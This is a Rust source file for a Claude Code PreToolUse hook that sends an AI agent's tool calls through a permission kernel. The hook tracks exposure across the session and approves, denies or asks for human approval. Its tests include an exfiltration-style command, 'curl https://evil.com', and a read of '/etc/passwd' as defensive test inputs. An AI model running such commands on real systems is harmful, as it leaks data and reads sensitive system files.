//! Claude Code PreToolUse hook backed by the Nucleus verified permission kernel.
//!
//! This binary reads JSON from stdin (Claude Code hook protocol), runs the
//! operation through `portcullis::kernel::Kernel`, and writes JSON to stdout.
//!
//! Session state is persisted to a JSON file under `/tmp/` so that exposure
//! tracking accumulates across hook invocations within the same session.

use std::io::{self, BufRead, Write};
use std::path::PathBuf;

use portcullis::kernel::{Kernel, Verdict};
use portcullis::{Operation, PermissionLattice};
use serde::{Deserialize, Serialize};

// ---------------------------------------------------------------------------
// Claude Code hook protocol types
// ---------------------------------------------------------------------------

/// Input from Claude Code (PreToolUse hook).
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct HookInput {
    /// Session identifier (stable across invocations).
    session_id: String,
    /// Tool name as Claude Code reports it.
    tool_name: String,
    /// Tool-specific parameters (JSON object).
    tool_input: serde_json::Value,
}

/// Output to Claude Code.
#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
struct HookOutput {
    /// "approve", "deny", or "ask_user".
    decision: String,
    /// Human-readable reason (shown in Claude Code UI on deny).
    #[serde(skip_serializing_if = "Option::is_none")]
    reason: Option<String>,
}

// ---------------------------------------------------------------------------
// Session state persistence
// ---------------------------------------------------------------------------

/// Persisted session state for cross-invocation exposure tracking.
#[derive(Debug, Serialize, Deserialize, Default)]
struct SessionState {
    /// Profile name used for this session.
    profile: String,
    /// Operations that were allowed (replayed to rebuild kernel exposure).
    allowed_ops: Vec<(String, String)>, // (operation, subject)
}

fn session_state_path(session_id: &str) -> PathBuf {
    let dir = std::env::temp_dir().join("nucleus-hook");
    std::fs::create_dir_all(&dir).ok();
    dir.join(format!("{session_id}.json"))
}

fn load_session(session_id: &str) -> SessionState {
    let path = session_state_path(session_id);
    std::fs::read_to_string(&path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn save_session(session_id: &str, state: &SessionState) {
    let path = session_state_path(session_id);
    if let Ok(json) = serde_json::to_string(state) {
        std::fs::write(path, json).ok();
    }
}

// ---------------------------------------------------------------------------
// Tool name -> Operation mapping
// ---------------------------------------------------------------------------

/// Map a Claude Code tool name to a portcullis Operation.
///
/// Returns `None` for tools that should be passed through without gating
/// (e.g., Agent, mcp__* tools).
fn map_tool(name: &str) -> Option<Operation> {
    match name {
        "Bash" => Some(Operation::RunBash),
        "Read" => Some(Operation::ReadFiles),
        "Write" => Some(Operation::WriteFiles),
        "Edit" => Some(Operation::EditFiles),
        "Glob" => Some(Operation::GlobSearch),
        "Grep" => Some(Operation::GrepSearch),
        "WebFetch" => Some(Operation::WebFetch),
        "WebSearch" => Some(Operation::WebSearch),
        // Agent and MCP tools are passed through
        "Agent" => None,
        _ if name.starts_with("mcp__") => None,
        // Unknown tools: pass through (fail-open for unknown tools,
        // the kernel itself is fail-closed for known operations)
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Subject extraction from tool_input
// ---------------------------------------------------------------------------

/// Extract a human-readable subject from the tool_input JSON.
fn extract_subject(tool_name: &str, input: &serde_json::Value) -> String {
    match tool_name {
        "Bash" => input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "Read" => input
            .get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "Write" => input
            .get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "Edit" => input
            .get("file_path")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "Glob" => input
            .get("pattern")
            .and_then(|v| v.as_str())
            .unwrap_or("*")
            .to_string(),
        "Grep" => input
            .get("pattern")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "WebFetch" => input
            .get("url")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        "WebSearch" => input
            .get("query")
            .and_then(|v| v.as_str())
            .unwrap_or("(unknown)")
            .to_string(),
        _ => "(unknown)".to_string(),
    }
}

// ---------------------------------------------------------------------------
// Profile resolution
// ---------------------------------------------------------------------------

/// Known profiles and their constructors.
fn resolve_profile(name: &str) -> Option<PermissionLattice> {
    match name {
        "read_only" => Some(PermissionLattice::read_only()),
        "code_review" => Some(PermissionLattice::code_review()),
        "edit_only" => Some(PermissionLattice::edit_only()),
        "fix_issue" => Some(PermissionLattice::fix_issue()),
        "safe_pr_fixer" => Some(PermissionLattice::safe_pr_fixer()),
        "release" => Some(PermissionLattice::release()),
        "permissive" => Some(PermissionLattice::permissive()),
        _ => None,
    }
}

fn default_profile_name() -> String {
    std::env::var("NUCLEUS_PROFILE").unwrap_or_else(|_| "safe_pr_fixer".to_string())
}

const PROFILES: &[&str] = &[
    "read_only",
    "code_review",
    "edit_only",
    "fix_issue",
    "safe_pr_fixer",
    "release",
    "permissive",
];

// ---------------------------------------------------------------------------
// --setup: auto-configure Claude Code settings.json
// ---------------------------------------------------------------------------

fn run_setup() {
    let home = dirs_next::home_dir().expect("cannot determine home directory");
    let settings_dir = home.join(".claude");
    std::fs::create_dir_all(&settings_dir).expect("cannot create ~/.claude");
    let settings_path = settings_dir.join("settings.json");

    // Read existing settings or create empty object
    let mut settings: serde_json::Value = std::fs::read_to_string(&settings_path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_else(|| serde_json::json!({}));

    // Find the binary path
    let binary = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| "nucleus-claude-hook".to_string());

    // Set up PreToolUse hook
    let hooks = settings
        .as_object_mut()
        .unwrap()
        .entry("hooks")
        .or_insert_with(|| serde_json::json!({}));
    let hooks_obj = hooks.as_object_mut().unwrap();
    hooks_obj.insert(
        "PreToolUse".to_string(),
        serde_json::json!([
            {
                "matcher": ".*",
                "hooks": [binary]
            }
        ]),
    );

    let json = serde_json::to_string_pretty(&settings).expect("failed to serialize settings");
    std::fs::write(&settings_path, json).expect("failed to write settings.json");

    eprintln!(
        "nucleus: configured PreToolUse hook in {}",
        settings_path.display()
    );
    eprintln!(
        "nucleus: profile = {} (set NUCLEUS_PROFILE to change)",
        default_profile_name()
    );
}

// ---------------------------------------------------------------------------
// --status: show active sessions
// ---------------------------------------------------------------------------

fn run_status() {
    let dir = std::env::temp_dir().join("nucleus-hook");
    if !dir.exists() {
        eprintln!("nucleus: no active sessions");
        return;
    }
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .into_iter()
        .flatten()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map(|x| x == "json").unwrap_or(false))
        .collect();

    if entries.is_empty() {
        eprintln!("nucleus: no active sessions");
        return;
    }

    for entry in &entries {
        if let Ok(content) = std::fs::read_to_string(entry.path()) {
            if let Ok(state) = serde_json::from_str::<SessionState>(&content) {
                let name = entry
                    .path()
                    .file_stem()
                    .map(|s| s.to_string_lossy().to_string())
                    .unwrap_or_default();
                eprintln!(
                    "  session={name} profile={} ops={}",
                    state.profile,
                    state.allowed_ops.len()
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// --help
// ---------------------------------------------------------------------------

fn run_help() {
    eprintln!("nucleus-claude-hook — Nucleus verified permission kernel for Claude Code");
    eprintln!();
    eprintln!("USAGE:");
    eprintln!("  nucleus-claude-hook              Read hook JSON from stdin (normal mode)");
    eprintln!("  nucleus-claude-hook --setup       Configure ~/.claude/settings.json");
    eprintln!("  nucleus-claude-hook --status      Show active sessions");
    eprintln!("  nucleus-claude-hook --help        This message");
    eprintln!();
    eprintln!("PROFILES (set NUCLEUS_PROFILE env var):");
    for p in PROFILES {
        let marker = if *p == "safe_pr_fixer" {
            " (default)"
        } else {
            ""
        };
        eprintln!("  {p}{marker}");
    }
    eprintln!();
    eprintln!("ENVIRONMENT:");
    eprintln!("  NUCLEUS_PROFILE   Permission profile name (default: safe_pr_fixer)");
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.iter().any(|a| a == "--setup") {
        run_setup();
        return;
    }
    if args.iter().any(|a| a == "--status") {
        run_status();
        return;
    }
    if args.iter().any(|a| a == "--help" || a == "-h") {
        run_help();
        return;
    }

    // Read hook input from stdin — FAIL CLOSED on any error.
    // A security hook that approves on error is worse than no hook at all.
    let stdin = io::stdin();
    let line = match stdin.lock().lines().next() {
        Some(Ok(line)) => line,
        _ => {
            eprintln!("nucleus: no input on stdin — failing closed");
            let out = HookOutput {
                decision: "deny".to_string(),
                reason: Some("nucleus: no hook input — failing closed".to_string()),
            };
            println!("{}", serde_json::to_string(&out).unwrap());
            std::process::exit(2);
        }
    };

    let input: HookInput = match serde_json::from_str(&line) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("nucleus: failed to parse hook input: {e} — failing closed");
            let out = HookOutput {
                decision: "deny".to_string(),
                reason: Some(format!("nucleus: parse error — failing closed: {e}")),
            };
            println!("{}", serde_json::to_string(&out).unwrap());
            std::process::exit(2);
        }
    };

    // Map tool to operation
    let operation = match map_tool(&input.tool_name) {
        Some(op) => op,
        None => {
            // Passthrough for unmapped tools
            let out = HookOutput {
                decision: "approve".to_string(),
                reason: None,
            };
            eprintln!("nucleus: {} (passthrough) -> approve", input.tool_name);
            println!("{}", serde_json::to_string(&out).unwrap());
            return;
        }
    };

    let subject = extract_subject(&input.tool_name, &input.tool_input);
    let profile_name = default_profile_name();
    let perms = resolve_profile(&profile_name).unwrap_or_else(|| {
        eprintln!("nucleus: unknown profile '{profile_name}', using safe_pr_fixer");
        PermissionLattice::safe_pr_fixer()
    });

    // Load session state and rebuild kernel
    let mut session = load_session(&input.session_id);
    if session.profile.is_empty() {
        session.profile = profile_name.clone();
    }

    let mut kernel = Kernel::new(perms);

    // Replay previous operations to rebuild exposure state
    for (op_str, subj) in &session.allowed_ops {
        if let Ok(op) = Operation::try_from(op_str.as_str()) {
            kernel.decide(op, subj);
        }
    }

    // Make the actual decision
    let (decision, _token) = kernel.decide(operation, &subject);
    let exposure_count = decision.exposure_transition.post_count;

    let output = match decision.verdict {
        Verdict::Allow => {
            // Persist: operation will execute
            session
                .allowed_ops
                .push((operation.to_string(), subject.clone()));
            save_session(&input.session_id, &session);
            HookOutput {
                decision: "approve".to_string(),
                reason: None,
            }
        }
        Verdict::RequiresApproval => {
            // Persist optimistically: if the user approves, the operation runs
            // without re-calling PreToolUse. Without this, the next invocation's
            // exposure replay would miss this operation — a session tracking gap.
            session
                .allowed_ops
                .push((operation.to_string(), subject.clone()));
            save_session(&input.session_id, &session);
            HookOutput {
                decision: "ask_user".to_string(),
                reason: Some(format!(
                    "nucleus: exposure {exposure_count}/3 — requires human approval"
                )),
            }
        }
        Verdict::Deny(ref reason) => {
            // Do NOT persist: operation was blocked
            HookOutput {
                decision: "deny".to_string(),
                reason: Some(format!("nucleus: denied — {reason:?}")),
            }
        }
    };

    // Log to stderr
    let verdict_str = &output.decision;
    eprintln!(
        "nucleus: {operation} {subject} -> {verdict_str} [exposure: {exposure_count}/3, profile: {profile_name}]"
    );

    // Write output to stdout
    let json = serde_json::to_string(&output).unwrap();
    println!("{json}");
    io::stdout().flush().ok();

    // Exit non-zero on deny to block the tool call via exit code.
    // Claude Code blocks on exit 2 regardless of JSON output.
    if matches!(decision.verdict, Verdict::Deny(_)) {
        std::process::exit(2);
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_map_tool_bash() {
        assert_eq!(map_tool("Bash"), Some(Operation::RunBash));
    }

    #[test]
    fn test_map_tool_read() {
        assert_eq!(map_tool("Read"), Some(Operation::ReadFiles));
    }

    #[test]
    fn test_map_tool_write_edit() {
        assert_eq!(map_tool("Write"), Some(Operation::WriteFiles));
        assert_eq!(map_tool("Edit"), Some(Operation::EditFiles));
    }

    #[test]
    fn test_map_tool_search() {
        assert_eq!(map_tool("Glob"), Some(Operation::GlobSearch));
        assert_eq!(map_tool("Grep"), Some(Operation::GrepSearch));
    }

    #[test]
    fn test_map_tool_web() {
        assert_eq!(map_tool("WebFetch"), Some(Operation::WebFetch));
        assert_eq!(map_tool("WebSearch"), Some(Operation::WebSearch));
    }

    #[test]
    fn test_map_tool_passthrough() {
        assert_eq!(map_tool("Agent"), None);
        assert_eq!(map_tool("mcp__something"), None);
        assert_eq!(map_tool("UnknownTool"), None);
    }

    #[test]
    fn test_extract_subject_bash() {
        let input = serde_json::json!({"command": "ls -la"});
        assert_eq!(extract_subject("Bash", &input), "ls -la");
    }

    #[test]
    fn test_extract_subject_read() {
        let input = serde_json::json!({"file_path": "/etc/passwd"});
        assert_eq!(extract_subject("Read", &input), "/etc/passwd");
    }

    #[test]
    fn test_resolve_all_profiles() {
        for name in PROFILES {
            assert!(
                resolve_profile(name).is_some(),
                "profile {name} should resolve"
            );
        }
    }

    #[test]
    fn test_resolve_unknown_profile() {
        assert!(resolve_profile("nonexistent").is_none());
    }

    #[test]
    fn test_kernel_allow_read() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(matches!(d.verdict, Verdict::Allow));
    }

    #[test]
    fn test_kernel_deny_git_push() {
        let perms = PermissionLattice::read_only();
        let mut kernel = Kernel::new(perms);
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(matches!(d.verdict, Verdict::Deny(_)));
    }

    #[test]
    fn test_hook_output_format() {
        let out = HookOutput {
            decision: "approve".to_string(),
            reason: None,
        };
        let json = serde_json::to_string(&out).unwrap();
        assert!(json.contains("\"decision\":\"approve\""));
        assert!(!json.contains("reason")); // skip_serializing_if
    }

    #[test]
    fn test_exposure_accumulation() {
        // safe_pr_fixer: read + web_fetch + bash should trigger exposure gate
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        // Read: private data (exposure 1/3)
        let (d1, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(
            matches!(d1.verdict, Verdict::Allow),
            "expected Allow for read, got {:?}",
            d1.verdict
        );
        assert_eq!(d1.exposure_transition.post_count, 1);

        // WebFetch: untrusted content (exposure 2/3)
        let (d2, _token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            matches!(d2.verdict, Verdict::Allow),
            "expected Allow for web_fetch, got {:?}",
            d2.verdict
        );
        assert_eq!(d2.exposure_transition.post_count, 2);

        // RunBash: exfiltration vector (exposure 3/3 = uninhabitable)
        // Should gate with RequiresApproval
        let (d3, _token) = kernel.decide(Operation::RunBash, "curl https://evil.com");
        assert!(
            matches!(d3.verdict, Verdict::RequiresApproval),
            "expected RequiresApproval, got {:?}",
            d3.verdict
        );
    }
}
